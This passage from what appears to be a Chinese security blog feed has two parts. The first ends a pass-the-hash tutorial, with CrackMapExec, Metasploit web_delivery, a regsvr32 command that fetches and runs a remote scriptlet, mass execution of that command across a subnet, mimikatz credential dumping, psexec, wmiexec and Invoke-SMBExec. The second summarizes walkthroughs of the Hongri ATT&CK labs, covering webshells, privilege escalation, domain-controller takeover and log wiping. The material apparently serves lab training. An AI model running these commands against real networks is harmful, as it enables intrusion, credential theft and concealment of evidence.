class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cme smb -M met_inject --options</span><br><span class="line">[*] met_inject module options:</span><br><span class="line">    LHOST    IP hosting the handler</span><br><span class="line">    LPORT    Handler port</span><br><span class="line">    PAYLOAD  Payload to inject: reverse_http or reverse_https (default:reverse_https)</span><br><span class="line">    PROCID   Process ID to inject into (default: current powershell process)</span><br></pre></td></tr></table></figure><p>这是一个<code>http</code>或<code>https</code>的反弹shell，我们使用默认的<code>reverse_https</code>，提供需要的<code>LHOST</code>和<code>LPORT</code>的参数即可：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme<span class="built_in"> smb </span>17.10.0.10-150 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -M met_inject -o <span class="attribute">LHOST</span>=17.10.0.1 <span class="attribute">LPORT</span>=9999</span><br></pre></td></tr></table></figure><p>命令的意思是通过pass-the-hash批量攻击<code>17.10.0.10-17.10.0.150</code>网段的主机，并使其执行meterpreter的https反弹shell。</p><p>笔者测试时遇到问题，无法用<code>met_inject.py</code>模块正常getshell，不知道什么原因。因此选择直接通过命令执行getlshell。利用metasploit的<code>web_delivery</code>模块：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 17.10.0.1</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line"><span class="built_in">set</span> target 3</span><br><span class="line">run</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Started reverse TCP handler on 17.10.0.1:9999 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/1KZkey</span><br><span class="line">[*] Local IP: http://10.204.146.152:8080/1KZkey</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll</span><br></pre></td></tr></table></figure><p>通过pass-the-hash执行命令批量getshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x <span class="string">"regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll"</span></span><br></pre></td></tr></table></figure><h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">Metasploit</a></h5><p>search <code>psexec</code>，<code>smblogin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec_psh</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure><p>举例：</p><h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h5><p>先抓取hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords<span class="string">""</span></span><br></pre></td></tr></table></figure><p>得到hash之后：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:ssooking-pc /ntlm:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure><h5 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a></h5><p>exe 版本下载<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">链接</a></p><p>windows 管理规范<code>WMI</code>，实际上就是windows从<code>03/XP</code>开始就内置了这个系统插件。其设计初衷之一是为了管理员能更加方便的对远程windows主机进行各种日常管理。</p><p>严格来说它其实是为各种服务提供一个统一的调用接口，比如你想操作什么服务就去调用对应的服务类中的方法去执行你的操作。在渗透测试中，它意味着我们可以直接在本地操作远程目标机器上的进程、服务、注册表等包括其它一系列特权操作，wmi是一把在目标内网进行横向移动的非常趁手的武器。<code>wmiexec</code>是一个python2脚本，对windows自带的wmic做了一些强化，让渗透变得更容易。</p><p>只能说很多工具吧，比较好用的在这里介绍两种：</p><p>wmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为<code>LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure><h5 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h5><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/" target="_blank" rel="noopener">Invoke-WMIExec</a></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> <span class="number">17.10</span>.<span class="number">0.10</span> <span class="literal">-Domain</span> test.local <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> AFC44EE7351D61D00698796DA06B1EBF <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure><p>Invoke-SMBExec</p><p>通过在目标主机创建服务执行命令，所以权限为system</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> <span class="number">192.168</span>.<span class="number">0.2</span> <span class="literal">-Domain</span> ssookinging<span class="literal">-pc</span> <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> <span class="number">7</span>ECFFFF0C3548187607A14BAD0F88BB1 <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure><h5 id="Invoke-SMBClient："><a href="#Invoke-SMBClient：" class="headerlink" title="Invoke-SMBClient："></a>Invoke-SMBClient：</h5><p>支持SMB1, SMB2 (2.1), and SMB signing</p><p>如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本</p><p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target 192.168.0.102 -Domain workgroup -Username administrator -Hash 03bebb338e70244589ea67c7439c77ba -Command <span class="string">"notepad.exe"</span> -verbose</span><br></pre></td></tr></table></figure><h5 id="PTH-EXEC"><a href="#PTH-EXEC" class="headerlink" title="PTH-EXEC"></a>PTH-EXEC</h5><p>kali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exe</span><br><span class="line"></span><br><span class="line">pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe</span><br></pre></td></tr></table></figure><h3 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h3><p>结合攻击方法，总结防御思路如下：</p><ul><li>检查特殊文件.scf 和 desktop.ini，避免被添加UNC路径</li><li>如无特殊需要，建议配置防火墙规则禁止139和445端口</li></ul><h3 id="六、后渗透思路拓展"><a href="#六、后渗透思路拓展" class="headerlink" title="六、后渗透思路拓展"></a>六、后渗透思路拓展</h3><ul><li>内网欺骗劫持</li><li>钓鱼文件</li><li>后门命令</li><li>拿下一台文件服务器后，在上面创建图标、desktop.ini、link、url等</li><li><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">pass the hash with RDP</a></li><li>获取域控</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; run post/windows/gather/credentials/gpp</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;转载自:&lt;/strong&gt;&lt;a href=&quot;https://ssooking.github.io/yu-shen-tou-zhi-ntml-hash/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ssooking.gith
      
    
    </summary>
    
    
      <category term="域渗透" scheme="https://shu1l.github.io/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="NTML" scheme="https://shu1l.github.io/tags/NTML/"/>
    
  </entry>
  
  <entry>
    <title>红日安全ATT&amp;CK靶场总结</title>
    <link href="https://shu1l.github.io/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/"/>
    <id>https://shu1l.github.io/2020/06/05/hong-ri-an-quan-att-ck-ba-chang-zong-jie/</id>
    <published>2020-06-05T14:11:40.000Z</published>
    <updated>2020-06-28T07:50:18.438Z</updated>
    
    <content type="html"><![CDATA[<h2 id="红日安全ATT-amp-CK靶场-一"><a href="#红日安全ATT-amp-CK靶场-一" class="headerlink" title="红日安全ATT&amp;CK靶场(一)"></a>红日安全ATT&amp;CK靶场(一)</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>此文只记录打靶机过程的思路，因为我也是基本按照其他师傅的过程学习的，所以具体的过程可以去看其他师傅的文章。这里只记录下思路与过程。</p><h3 id="红队实战-一）："><a href="#红队实战-一）：" class="headerlink" title="红队实战(一）："></a>红队实战(一）：</h3><h5 id="详细教程：https-www-freebuf-com-column-230476-html"><a href="#详细教程：https-www-freebuf-com-column-230476-html" class="headerlink" title="详细教程：https://www.freebuf.com/column/230476.html"></a>详细教程：<a href="https://www.freebuf.com/column/230476.html" target="_blank" rel="noopener">https://www.freebuf.com/column/230476.html</a></h5><p>​                   <a href="https://www.freebuf.com/column/230725.html" target="_blank" rel="noopener">https://www.freebuf.com/column/230725.html</a></p><p><strong>拓扑结构：</strong></p><p><img src="D:%5Cblog%5Csource_posts%5C%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8ATT-CK%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93%5Ct018915c37beca70abc.png" alt=""></p><h4 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透:"></a>外网渗透:</h4><h5 id="思路一"><a href="#思路一" class="headerlink" title="思路一:"></a>思路一:</h5><ul><li><strong>nmap探测存活主机和端口，发现80开放。</strong></li></ul><p>​        <a href="https://blog.csdn.net/qq_37964989/article/details/84330693" target="_blank" rel="noopener">nmap常用命令总结</a></p><ul><li><strong>御剑、或dirmap、dirsearch等进行目录扫描</strong></li></ul><p>我用的dirmap,可以几个都试试:<a href="https://github.com/H4ckForJob/dirmap" target="_blank" rel="noopener">https://github.com/H4ckForJob/dirmap</a></p><ul><li><strong>识别网站指纹，发现为yxcms。</strong><ul><li>云悉指纹:<a href="https://www.yunsee.cn/" target="_blank" rel="noopener">https://www.yunsee.cn/</a></li><li>潮汐指纹:<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></li><li>who ami:<a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">http://whatweb.bugscaner.com/</a></li></ul></li><li><strong>搜索yxcms网站漏洞，找到默认后台，弱口令成功登录。</strong></li></ul><p>​          <a href="https://www.freebuf.com/column/162886.html" target="_blank" rel="noopener">yxcms app 1.4.6 漏洞集合</a></p><ul><li><strong>yxcms后台，直接在前台index模板中插入一句话木马。</strong></li></ul><p><a href="http://whatweb.bugscaner.com/" target="_blank" rel="noopener">后台拿webshell的方法总结</a></p><ul><li><strong>菜刀连接，即可获得后门</strong></li><li>常见的webshell管理工具<ul><li><a href="https://www.uedbox.com/post/8136/" target="_blank" rel="noopener">中国蚁剑AntSword</a></li><li><a href="https://www.uedbox.com/post/51677/" target="_blank" rel="noopener">中国菜刀 (caidao)</a></li><li><a href="https://www.uedbox.com/post/51031/" target="_blank" rel="noopener">冰蝎 webshell</a></li><li>cknife (c刀)</li><li><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">webshell收集i项目</a></li></ul></li></ul><h5 id="思路二："><a href="#思路二：" class="headerlink" title="思路二："></a>思路二：</h5><ul><li><strong>nmap探测存活主机和端口，发现80开放</strong>。</li><li><strong>御剑、或dirmap、dirsearch等进行目录扫描</strong></li><li><strong>发现phpmyadmin,弱口令root，root登录。</strong></li><li><strong>phpmyadmin通过开启全局日志的方式getshell，</strong></li></ul><p>​      <a href="https://www.cnblogs.com/0nc3/p/12071314.html" target="_blank" rel="noopener">[phpmyadmin后台getshell方法学习总结]</a></p><h4 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul><li><strong>1.使用msfvenom生成payload文件，使用菜刀上传到WWW目录下，msf监听连接。</strong></li></ul><p>​      <a href="https://shu1l.github.io/2020/04/27/msf-fan-dan-payload-xue-xi/">MSF反弹payload学习</a></p><ul><li><p><strong>查看获得的用户权限，通常通过web漏洞获得的webshell权限较低，需要进行提权。</strong></p><p>windows提权exp： <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester" target="_blank" rel="noopener">Windows-Exploit-Suggester</a></p></li><li><p><strong>这里直接使用getsystem即可提权</strong>，<strong>如果不成功可以使用msf中自带的绕过UAC模块，设置执行后再次尝试getsystem就可获得权限</strong></p></li></ul><p>​       <a href="https://www.freebuf.com/articles/system/185311.html" target="_blank" rel="noopener">使用Metasploit绕过UAC的多种方法 </a></p><ul><li><strong>然后我们就可以执行一些后渗透的常规姿势，添加管理员，开3389，关防火墙，主机信息收集,后门植入等等</strong></li></ul><p>​       <a href="https://xz.aliyun.com/t/2536#toc-0" target="_blank" rel="noopener">后渗透之meterpreter使用攻略</a></p><ul><li><p><strong>mimikatz抓取本地用户的hash密码</strong></p><p><a href="https://www.cnblogs.com/-mo-/p/11890232.html" target="_blank" rel="noopener">后渗透]Mimikatz使用大全</a></p></li><li><p><strong>后渗透信息收集</strong>，<strong>包括定位域控，查询域管理员和域用户，添加域管理员等等</strong></p></li><li><p>利用powershell框架进行后渗透信息收集:</p><ul><li><a href="https://www.freebuf.com/sectool/87647.html" target="_blank" rel="noopener">一些值得收藏的PowerShell工具</a></li><li><a href="https://www.secpulse.com/archives/55893.html" target="_blank" rel="noopener">Powershell &amp; Powersploit 入门</a></li><li><a href="https://www.secpulse.com/archives/73766.html" target="_blank" rel="noopener">内网工具学习之Empire后渗透</a></li><li><a href="https://www.cnblogs.com/-qing-/p/10742487.html" target="_blank" rel="noopener">nishang的介绍与使用</a></li><li>域渗透信息收集常见操作<ul><li><a href="https://xz.aliyun.com/t/7777#toc-0" target="_blank" rel="noopener">内网信息收集</a></li></ul></li></ul></li><li><p><strong>根据信息收集，我们可以知道域控的地址，域成员主机03地址。</strong></p></li><li><p><strong>接着进行横向渗透，首先需要添加路由和代理。</strong></p></li></ul><p>​       <a href="https://evoa.me/index.php/archives/37/" target="_blank" rel="noopener">[MSF学习-端口转发代理及路由功能-三层内网靶场渗透]</a></p><ul><li><strong>添加路由成功后，可以根据作者给出的漏洞列表直接用msf里的模块打（服务默认需要手动开启）</strong></li></ul><p><a href="https://p2.ssl.qhimg.com/t0165052491af946555.png" target="_blank" rel="noopener"><img src="D:%5Cblog%5Csource_posts%5C%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8ATT-CK%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93%5Ct0165052491af946555.png" alt="img"></a></p><ul><li><strong>利用ms17-010获取2003机器的shell，这里吐槽下msf自带的模块，就没打成功过。。</strong></li></ul><p>​       这里给一个比较好用的模块：<a href="https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit" target="_blank" rel="noopener">https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit</a></p><p>​         先知一篇讲永恒之蓝的文章 ： <a href="https://xz.aliyun.com/t/2151#toc-1" target="_blank" rel="noopener">那些年，我们追过的“蓝”</a></p><ul><li><p><strong>2003我们直接getsystem提权，然后照上面操作导出用户hash即可。</strong></p></li><li><p>最后杀向域控，前面我们已经在win7机器上获取了域管理的账号密码。这里直接用</p></li></ul><p>​      <code>exploit/windows/smb/psexec</code>远程连接即可拿到shell，并且是管理员权限。</p><p>​      <a href="https://www.freebuf.com/articles/system/183670.html" target="_blank" rel="noopener">多种使用SMB端口远程连接PC的方法介绍 </a></p><ul><li><strong>植入后门</strong></li><li><strong>痕迹清理</strong></li></ul><h3 id="红队评估（二）"><a href="#红队评估（二）" class="headerlink" title="红队评估（二）"></a>红队评估（二）</h3><h5 id="详细教程"><a href="#详细教程" class="headerlink" title="详细教程"></a>详细教程</h5><p><a href="https://www.anquanke.com/post/id/193193" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193193</a></p><p><a href="https://wh0ale.github.io/2019/12/11/VulnStack" target="_blank" rel="noopener">https://wh0ale.github.io/2019/12/11/VulnStack</a></p><h5 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">内网网段：<span class="number">10.10</span><span class="number">.10</span><span class="number">.1</span>/<span class="number">24</span></span><br><span class="line">DC</span><br><span class="line">IP：<span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span>OS：Windows <span class="number">2012</span>(<span class="number">64</span>)</span><br><span class="line">应用：AD域</span><br><span class="line">WEB</span><br><span class="line">IP1：<span class="number">10.10</span><span class="number">.10</span><span class="number">.80</span></span><br><span class="line">应用：Weblogic <span class="number">10.3</span><span class="number">.6</span>MSSQL <span class="number">2008</span></span><br><span class="line">PC</span><br><span class="line">IP1：<span class="number">10.10</span><span class="number">.10</span><span class="number">.201</span></span><br></pre></td></tr></table></figure><p>大体拓扑如下：</p><p><a href="https://p5.ssl.qhimg.com/t01bbcd3ad3d53a0ecd.jpg" target="_blank" rel="noopener"><img src="D:%5Cblog%5Csource_posts%5C%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8ATT-CK%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93%5Ct01bbcd3ad3d53a0ecd.jpg" alt="img"></a></p><h4 id="外网渗透-1"><a href="#外网渗透-1" class="headerlink" title="外网渗透"></a>外网渗透</h4><ul><li><p><strong>首先手动开启web机上weblogic服务，访问web机的7001端口。可以进入控制台。</strong></p></li><li><p><strong>使用WeblogicScan进行扫描，由扫描结果可知存在CVE-2019-2725</strong>。</p><p><a href="https://github.com/dr0op/WeblogicScan" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11503707.html" target="_blank" rel="noopener">Weblogic漏洞总结</a></p></li><li><p><strong>使用<code>CVE-2019-2725</code>的POC上传webshell，</strong></p></li></ul><p>​    <a href="https://www.cnblogs.com/liliyuanshangcao/p/10820583.html" target="_blank" rel="noopener"><a href="https://www.cnblogs.com/liliyuanshangcao/p/10820583.html" target="_blank" rel="noopener">（CVE-2019-2725）复现</a></a></p><ul><li><strong>或者直接使用msf自带的cve模块打一波，拿到shell.</strong></li><li><strong>或者使用这个脚本</strong>：<a href="https://github.com/TopScrew/CVE-2019-2725" target="_blank" rel="noopener">https://github.com/TopScrew/CVE-2019-2725</a></li></ul><h4 id="内网渗透-1"><a href="#内网渗透-1" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul><li><p><strong>后渗透常规操作走一波</strong></p><ul><li>查看用户权限，这里已经是管理员权限，暂不提权。</li><li>查看主机信息和开放端口</li><li>新建管理员用户，远程桌面登录。</li><li>因为这里靶机安装了360，所以需要上传procdump结合mimikatz在本地读取密码信息</li></ul><p>​      <a href="https://www.cnblogs.com/nul1/p/9285814.html" target="_blank" rel="noopener">利用procdump+Mimikatz 绕过杀软获取Windows明文密码</a></p><ul><li>最后使用msf生成个后门。</li></ul><p>​     <a href="https://www.freebuf.com/articles/web/180581.html" target="_blank" rel="noopener">后渗透阶段的权限维持（Windows篇） </a></p></li><li><p><strong>后渗透信息收集，收集域内信息，添加域管理员账号，定位域控</strong>。</p></li><li><p><strong>msf添加路由，搭建代理。</strong></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100115657" target="_blank" rel="noopener">reDuh搭建HTTP正向代理</a></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100132929" target="_blank" rel="noopener">ssocks+proxychains搭建代理</a></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100126207" target="_blank" rel="noopener">reGeorg + proxifier搭建SOCKS正向代理</a></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100129295" target="_blank" rel="noopener">xsocks+proxychains搭建代理</a></p><p><a href="https://blog.csdn.net/God_XiangYu/article/details/100123395" target="_blank" rel="noopener">tunna搭建HTTP正向代理</a></p></li><li><p><strong>刚刚已经拿到了域管理权限知道密码，直接用psexec连接域控制器拿下域控。</strong></p></li><li><p><strong>痕迹清理</strong></p><ul><li><p>获取日志分类列表：wevtutil el &gt;1.txt</p></li><li><p>获取单个日志类别的统计信息：wevtutil gli “windows powershell”</p></li><li><p>查看指定日志的具体内容：wevtutil qe /f:text “windows powershell”</p></li><li><p>删除单个日志类别的所有信息：wevtutil cl “windows powershell”</p></li><li><p><strong>破坏Windows日志记录功能</strong> </p><ul><li><a href="https://github.com/hlldz/Invoke-Phant0m" target="_blank" rel="noopener">Invoke-Phant0m</a></li><li><a href="https://github.com/3gstudent/Windwos-EventLog-Bypass" target="_blank" rel="noopener">Windwos-EventLog-Bypass</a></li></ul></li><li><p><strong>msf</strong>  run clearlogs   clearev</p></li></ul></li></ul><h3 id="红队实战（三）"><a href="#红队实战（三）" class="headerlink" title="红队实战（三）"></a>红队实战（三）</h3><h5 id="环境拓扑"><a href="#环境拓扑" class="headerlink" title="环境拓扑"></a>环境拓扑</h5><p><img src="D:%5Cblog%5Csource_posts%5C%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8ATT-CK%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93%5C20191223205755-d65c291e-2583-1.png" alt="img"></p><h4 id="外网渗透-2"><a href="#外网渗透-2" class="headerlink" title="外网渗透"></a>外网渗透</h4><ul><li><p><strong>首先发现80端口网站是个joomla!，探测版本，发现是3.9.2较高的版本。</strong></p><ul><li><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">JoomScan开源扫描器</a></li><li><a href="https://www.anquanke.com/post/id/188177" target="_blank" rel="noopener">Joomla 3.4.6远程代码执行漏洞原理分析和poc</a></li><li><a href="https://blog.csdn.net/m0_37438418/article/details/80976593" target="_blank" rel="noopener">Joomla漏洞</a></li></ul></li><li><p><strong>然后扫了下目录，发现存在备份的配置文件configuration.php。</strong></p></li><li><p><strong>在配置文件中得到了一个mysql普通数据库用户</strong></p></li></ul><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testuser cvcvgjASD!@</span><br></pre></td></tr></table></figure><ul><li><p><strong>探测端口发现3306开放，尝试使用拿到的mysql密码登录</strong></p></li><li><p><strong>登录成功，拿到了joomla!的数据库，尝试添加管理员 admin2</strong> </p></li><li><p><strong>使用账号admin2 secret登录后台：<a href="http://192.168.1.110/administrator/index.php" target="_blank" rel="noopener">http://192.168.1.110/administrator/index.php</a></strong></p></li><li><p><strong>通过模板修改，getshell。然后访问shell。</strong></p></li><li><p><strong>这里得绕一下disable_function。可以用LD_PRELOAD绕过。</strong></p><ul><li><a href="https://xz.aliyun.com/t/5320" target="_blank" rel="noopener">PHP Webshell下绕过disable_function的方法</a></li></ul></li><li><p>在ubuntu上找到了个test.txt，存放着应该是账号密码。</p></li><li><p>尝试使用wwwuser通过ssh登陆192.168.1.110</p></li></ul><h4 id="内网渗透-2"><a href="#内网渗透-2" class="headerlink" title="内网渗透"></a>内网渗透</h4><ul><li><p>上msf，scp上传payload到centos，centos执行payload获取shell。</p><p><a href="https://www.cnblogs.com/tugenhua0707/p/8278772.html" target="_blank" rel="noopener">[scp传输文件的命令]</a></p></li><li><p>添加路由,使用msf扫描获取周围windows信息。</p><p>​    <a href="https://www.cnblogs.com/Hi-blog/p/7413406.html#autoid-5-3-0" target="_blank" rel="noopener">MSF的辅助扫描模块（信息搜集）</a></p></li><li><p>得到了三台加入test域的windows主机</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.93.20 windows<span class="built_in"> server </span>2008</span><br><span class="line"></span><br><span class="line">192.168.93.30 windows 7</span><br><span class="line"></span><br><span class="line">192.168.93.10 windows<span class="built_in"> server </span>2012</span><br></pre></td></tr></table></figure></li><li><p>尝试爆破一下windows server 2008的本地管理员，得到了本地管理员的密码：123qwe!ASD</p></li><li><p>搭建目标网络代理，kali使用proxychains来代理socs4a。</p></li><li><p>用<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">wmiexec</a>执行命令，使用得到的密码远程连接目标机器</p><p>​    <a href="http://www.91ri.org/12908.html" target="_blank" rel="noopener">利用WMI代替psexec（WMIEXEC.vbs）</a></p><p>​    <a href="https://www.cnblogs.com/ssooking/articles/6082407.html" target="_blank" rel="noopener">丢掉PSEXEC来横向渗透</a></p></li><li><p>查看进程时发现有test域的administrator的进程，于是尝试抓一下密码</p></li><li><p>kali下使用smbclient通过代理连接windows server 2008 上传mimikatz。</p><p>​    <a href="[https://www.marksec.org/2019/04/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8Bsmbclient%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/](https://www.marksec.org/2019/04/10/内网渗透之smbclient工具学习/)">内网渗透之smbclient工具学习</a></p></li><li><p>wmiexec远程执行mimikatz抓到了test域的administrator密码。</p><p><a href="https://cloud.tencent.com/developer/article/1171183" target="_blank" rel="noopener">九种姿势运行Mimikatz</a></p></li><li><p>查看windows server 2008的ip，然后ping test.org获取到域控制器ip</p></li><li><p>直接ipc连接（环境有点问题，3389连接域控提示administrator的密码过期了）</p></li><li><p>得到重要文件flag.txt。</p></li></ul><h3 id="红队评估（五）"><a href="#红队评估（五）" class="headerlink" title="红队评估（五）"></a>红队评估（五）</h3><h5 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h5><p><strong>Win7 +phpstudy+thinkphp（5.0.22）</strong> </p><p>ip  192.168.135.150</p><p>ip  192.168.138.136</p><p><strong>Win2008</strong>     </p><p>ip 192.168.138.138</p><p><strong>攻击机 win10</strong>     </p><p>ip  192.168.135.143</p><h4 id="外网渗透-3"><a href="#外网渗透-3" class="headerlink" title="外网渗透"></a>外网渗透</h4><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul><li><p><strong>漏洞搜索与利用，浏览器访问192.168.135.150，发现是thinkphp框架，爆下错，看下tp版本为5.0.22。</strong></p><ul><li><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection" target="_blank" rel="noopener">thinkphp v5.x 